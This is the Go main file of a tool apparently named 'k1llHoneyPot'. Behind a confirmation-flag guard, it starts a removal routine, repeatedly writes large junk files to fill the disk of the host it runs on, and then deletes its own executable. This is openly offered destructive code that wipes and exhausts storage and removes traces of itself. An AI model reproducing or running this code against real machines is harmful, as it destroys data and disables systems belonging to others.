package main

import (
	"errors"
	"flag"
	"log"
	"os"
	"runtime"
	"time"

	"k1llHoneyPot/utils"
)

var (
	ErrAntiAccident = errors.New("anti-accident mechanism activated")
)

func init() {
	var confirmStr string
	flag.StringVar(&confirmStr, "woc", "", "")
	flag.Parse()
	if len(confirmStr) < 3 {
		panic(ErrAntiAccident)
	}
}

func main() {
	var writeSize int
	sigChan := make(chan int, 1)

	go utils.ExecuteRM(sigChan)

	a, b, c := utils.RetrieveSpareSpace()
	log.Printf("a:%d b:%d c:%v \n", a, b, c)

	if c {
		writeSize = func() int {
			switch b {
			case 3:
				return 1536
			case 2:
				return 48
			case -1:
				return -1
			default:
				return 1
			}
		}()
	}

	cwd, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	for {
		time.Sleep(5 * time.Second)
		cleanFlag, err := utils.WriteBoomer(cwd+"/"+utils.RandFilename(runtime.GOOS == "windows"), writeSize)
		if cleanFlag {
			utils.CleanFiles()
		}
		if err != nil {
			break
		}
	}

	<-sigChan

	myName, _ := os.Executable()
	_ = os.Remove(myName)
}
